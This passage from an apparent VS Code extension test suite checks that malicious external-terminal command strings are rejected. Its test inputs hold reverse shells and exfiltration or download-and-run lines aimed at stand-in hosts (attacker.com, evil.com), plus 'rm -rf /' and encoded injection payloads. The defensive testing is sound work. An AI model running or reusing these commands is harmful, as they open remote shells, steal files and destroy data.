          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for base64 payload, got: ${error.message}`
          );
        }
      });

      test('should reject commands with hex-encoded payloads', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal $(printf "\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68")');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for hex-encoded payload');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for hex payload, got: ${error.message}`
          );
        }
      });

      test('should reject commands with multiple metacharacter combinations', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal; cat /etc/passwd | nc attacker.com 1234 & rm -rf /tmp');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for multiple metacharacters');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for multiple metacharacters, got: ${error.message}`
          );
        }
      });

      test('should reject commands with obfuscated injection using quotes', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal --title="; malicious"');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for obfuscated injection');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for obfuscated injection, got: ${error.message}`
          );
        }
      });

      test('should reject commands with newline injection', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal\nmalicious-command');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for newline injection');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for newline injection, got: ${error.message}`
          );
        }
      });

      test('should reject commands with tab injection', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal\tmalicious');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for tab injection');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for tab injection, got: ${error.message}`
          );
        }
      });

      test('should reject commands with carriage return injection', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal\rmalicious');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for carriage return injection');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for carriage return injection, got: ${error.message}`
          );
        }
      });

      test('should reject commands with command substitution in arguments', async () => {
        const service = TestHelpers.setupExternalTerminal('konsole --workdir $(whoami)');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for command substitution in arguments');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for command substitution in args, got: ${error.message}`
          );
        }
      });

      test('should reject commands with backticks in arguments', async () => {
        const service = TestHelpers.setupExternalTerminal('xfce4-terminal --working-directory=`pwd`');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for backticks in arguments');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for backticks in args, got: ${error.message}`
          );
        }
      });

      test('should reject commands with variable substitution in arguments', async () => {
        const service = TestHelpers.setupExternalTerminal('alacritty --working-directory $HOME');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for variable substitution in arguments');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for variable substitution in args, got: ${error.message}`
          );
        }
      });

      test('should reject commands with wildcards in path arguments', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal --working-directory=/home/*');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for wildcards in arguments');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for wildcards in args, got: ${error.message}`
          );
        }
      });

      test('should reject commands with brace expansion', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal {/usr,/bin}/evil');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for brace expansion');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for brace expansion, got: ${error.message}`
          );
        }
      });
    });

    suite('Platform-Specific Malicious Commands', () => {
      test('should reject Linux-specific reverse shells', async () => {
        const service = TestHelpers.setupExternalTerminal('/bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for Linux reverse shell');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for Linux reverse shell, got: ${error.message}`
          );
        }
      });

      test('should reject Windows PowerShell injection attempts', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupExternalTerminal('powershell.exe -Command "Invoke-Expression (Get-Content malicious.ps1)"');
          const paths = TestHelpers.getTestPaths();
          const parentDir = path.dirname(paths.unixFile);
          TestSetup.addFile(parentDir, true);

          try {
            await service.openDirectoryInTerminal(parentDir);
            assert.fail('Should have thrown error for PowerShell injection');
          } catch (error: any) {
            assert.ok(
              error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
              `Expected unsafe command error for PowerShell injection, got: ${error.message}`
            );
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should reject Windows cmd.exe chain injection', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupExternalTerminal('cmd.exe /c "dir & malicious"');
          const paths = TestHelpers.getTestPaths();
          const parentDir = path.dirname(paths.unixFile);
          TestSetup.addFile(parentDir, true);

          try {
            await service.openDirectoryInTerminal(parentDir);
            assert.fail('Should have thrown error for cmd.exe chain injection');
          } catch (error: any) {
            assert.ok(
              error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
              `Expected unsafe command error for cmd.exe injection, got: ${error.message}`
            );
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should reject macOS osascript injection attempts', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'darwin' });

          const service = TestHelpers.setupExternalTerminal('osascript -e \'do shell script "rm -rf /"\'');
          const paths = TestHelpers.getTestPaths();
          const parentDir = path.dirname(paths.unixFile);
          TestSetup.addFile(parentDir, true);

          try {
            await service.openDirectoryInTerminal(parentDir);
            assert.fail('Should have thrown error for osascript injection');
          } catch (error: any) {
            assert.ok(
              error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
              `Expected unsafe command error for osascript injection, got: ${error.message}`
            );
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });
    });

    suite('Edge Cases and Complex Scenarios', () => {
      test('should reject commands with extremely long injection payloads', async () => {
        const longPayload = 'gnome-terminal; ' + 'A'.repeat(1000) + '; rm -rf /';
        const service = TestHelpers.setupExternalTerminal(longPayload);
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for long injection payload');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for long payload, got: ${error.message}`
          );
        }
      });

      test('should reject commands with null byte attempts', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal\0malicious');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for null byte attempt');
        } catch (error: any) {
          // Either reject with unsafe command error or handle gracefully
          assert.ok(
            error.message.includes('Invalid or unsafe') ||
            error.message.includes('Failed to open external terminal') ||
            error.message.includes('null') ||
            error.message.includes('Invalid'),
            `Expected error for null byte, got: ${error.message}`
          );
        }
      });

      test('should reject commands with unicode escape sequences', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal \\u0024\\u0028rm -rf /\\u0029');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for unicode escape');
        } catch (error: any) {
          // Unicode escapes might pass validation but should still be handled
          assert.ok(
            error.message.includes('Invalid or unsafe') ||
            error.message.includes('Failed to open external terminal') ||
            !error.message.includes('command not found'),
            `Expected appropriate error for unicode escape, got: ${error.message}`
          );
        }
      });

      test('should reject commands with URL-encoded payloads', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal%3B%20rm%20-rf%20%2F');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for URL-encoded payload');
        } catch (error: any) {
          // URL encoding might make it pass validation but command won't exist
          assert.ok(
            error.message.includes('Invalid or unsafe') ||
            error.message.includes('Failed to open external terminal') ||
            error.message.includes('not found'),
            `Expected error for URL-encoded payload, got: ${error.message}`
          );
        }
      });

      test('should reject commands with mixed case injection attempts', async () => {
        const service = TestHelpers.setupExternalTerminal('Gnome-Terminal; Malicious');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for mixed case injection');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for mixed case, got: ${error.message}`
          );
        }
      });

      test('should reject commands with full path injection attempts', async () => {
        const service = TestHelpers.setupExternalTerminal('/usr/bin/gnome-terminal; /usr/bin/rm -rf /');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for full path injection');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for full path injection, got: ${error.message}`
          );
        }
      });

      test('should reject commands with environment variable expansion', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal ${HOME:-}/evil');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for environment variable expansion');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for env variable expansion, got: ${error.message}`
          );
        }
      });

      test('should reject commands with arithmetic expansion', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal $((1+1))');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for arithmetic expansion');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for arithmetic expansion, got: ${error.message}`
          );
        }
      });

      test('should reject commands with process substitution', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal <(malicious)');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for process substitution');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for process substitution, got: ${error.message}`
          );
        }
      });

      test('should reject commands with command chaining using OR', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal || malicious');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for OR chaining');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for OR chaining, got: ${error.message}`
          );
        }
      });

      test('should reject commands with AND chaining', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal && malicious');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for AND chaining');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for AND chaining, got: ${error.message}`
          );
        }
      });

      test('should reject commands with background execution', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal & malicious');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for background execution');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for background execution, got: ${error.message}`
          );
        }
      });
    });
  });

  suite('External Terminal Command Integration Tests', () => {
    suite('Full Workflow with Malicious Commands', () => {
      test('should reject malicious external terminal command in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal; rm -rf /');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for malicious command in full workflow');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error in full workflow, got: ${error.message}`
          );
        }
      });

      test('should reject command with pipe in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal | curl http://evil.com');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for command with pipe');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error, got: ${error.message}`
          );
        }
      });

      test('should reject command with backtick substitution in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal `whoami`');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for command with backticks');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error, got: ${error.message}`
          );
        }
      });

      test('should reject command with variable expansion in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal $HOME');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for command with variable expansion');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error, got: ${error.message}`
          );
        }
      });

      test('should reject command with command substitution in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('konsole --workdir $(pwd)');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for command with $() substitution');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error, got: ${error.message}`
          );
        }
      });

      test('should reject command with redirect in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('xfce4-terminal > /tmp/output');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for command with redirect');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error, got: ${error.message}`
          );
        }
      });

      test('should reject command not in allowlist in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('malicious-terminal-app');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for command not in allowlist');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error, got: ${error.message}`
          );
        }
      });
    });

    suite('Complex Attack Scenarios in Full Workflow', () => {
      test('should reject reverse shell attempt in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal && nc -e /bin/sh attacker.com 4444');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for reverse shell attempt');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for reverse shell, got: ${error.message}`
          );
        }
      });

      test('should reject data exfiltration attempt in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal | curl -X POST http://attacker.com -d @/etc/passwd');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for data exfiltration attempt');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for data exfiltration, got: ${error.message}`
          );
        }
      });

      test('should reject script download and execution in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal; wget http://evil.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for script download attempt');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for script download, got: ${error.message}`
          );
        }
      });

      test('should reject chained injection attempt in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal; rm -rf / && curl http://evil.com | bash');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for chained injection');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for chained injection, got: ${error.message}`
          );
        }
      });

      test('should reject base64-encoded payload in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal $(echo "bWljcm9zb2Z0Cg==" | base64 -d)');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for base64-encoded payload');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for base64 payload, got: ${error.message}`
          );
        }
      });
    });

    suite('Platform-Specific Malicious Commands in Full Workflow', () => {
      test('should reject Linux reverse shell in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('/bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for Linux reverse shell');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for Linux reverse shell, got: ${error.message}`
          );
        }
      });

      test('should reject Windows PowerShell injection in full workflow', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupExternalTerminal('powershell.exe -Command "Invoke-Expression (Get-Content malicious.ps1)"');
          const paths = TestHelpers.getTestPaths();
          const parentDir = path.dirname(paths.unixFile);
          TestSetup.addFile(parentDir, true);

          try {
            await service.openInTerminal(paths.unixFile);
            assert.fail('Should have thrown error for PowerShell injection');
          } catch (error: any) {
            assert.ok(
              error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
              `Expected unsafe command error for PowerShell injection, got: ${error.message}`
            );
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should reject Windows cmd.exe chain injection in full workflow', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupExternalTerminal('cmd.exe /c "dir & malicious"');
          const paths = TestHelpers.getTestPaths();
          const parentDir = path.dirname(paths.unixFile);
          TestSetup.addFile(parentDir, true);

          try {
            await service.openInTerminal(paths.unixFile);
            assert.fail('Should have thrown error for cmd.exe injection');
          } catch (error: any) {
            assert.ok(
              error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
              `Expected unsafe command error for cmd.exe injection, got: ${error.message}`
            );
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should reject macOS osascript injection in full workflow', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'darwin' });

          const service = TestHelpers.setupExternalTerminal('osascript -e \'do shell script "rm -rf /"\'');
          const paths = TestHelpers.getTestPaths();
          const parentDir = path.dirname(paths.unixFile);
          TestSetup.addFile(parentDir, true);

          try {
            await service.openInTerminal(paths.unixFile);
            assert.fail('Should have thrown error for osascript injection');
          } catch (error: any) {
            assert.ok(
              error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
              `Expected unsafe command error for osascript injection, got: ${error.message}`
            );
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });
    });

    suite('Edge Cases with Malicious Commands in Full Workflow', () => {
      test('should reject command with newline injection in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal\nmalicious-command');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for newline injection');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for newline injection, got: ${error.message}`
          );
        }
      });

      test('should reject command with tab injection in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal\tmalicious');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for tab injection');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for tab injection, got: ${error.message}`
          );
        }
      });

      test('should reject command with carriage return in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal\rmalicious');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for carriage return injection');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for carriage return, got: ${error.message}`
          );
        }
      });

      test('should reject empty command in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for empty command');
        } catch (error: any) {
          assert.ok(
            error.message.includes('No external terminal command configured') || error.message.includes('Failed to open external terminal'),
            `Expected empty command error, got: ${error.message}`
          );
        }
      });

      test('should reject command with null byte in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal\0malicious');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for null byte attempt');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') ||
            error.message.includes('Failed to open external terminal') ||
            error.message.includes('null') ||
            error.message.includes('Invalid'),
            `Expected error for null byte, got: ${error.message}`
          );
        }
      });

      test('should reject command with extremely long payload in full workflow', async () => {
        const longPayload = 'gnome-terminal; ' + 'A'.repeat(1000) + '; rm -rf /';
        const service = TestHelpers.setupExternalTerminal(longPayload);
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          assert.fail('Should have thrown error for long injection payload');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for long payload, got: ${error.message}`
          );
        }
      });
    });

    suite('Valid Commands in Full Workflow', () => {
      test('should accept valid external terminal command in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal --working-directory={{directory}}');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created for valid command in full workflow');
        } catch (error) {
          assert.fail(`Should not throw error for valid command: ${error}`);
        }
      });

      test('should accept valid Windows command in full workflow', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupExternalTerminal('cmd.exe');
          const paths = TestHelpers.getTestPaths();
          const parentDir = path.dirname(paths.unixFile);
          TestSetup.addFile(parentDir, true);

          try {
            await service.openInTerminal(paths.unixFile);
            const mocks = TestSetup.getMocks();
            const terminal = mocks.vscode.getLastCreatedTerminal();
            assert.ok(terminal, 'Terminal should be created for valid Windows command');
          } catch (error) {
            assert.fail(`Should not throw error for valid Windows command: ${error}`);
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should accept valid terminal with arguments in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('konsole --workdir {{directory}}');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created for valid command with arguments');
        } catch (error) {
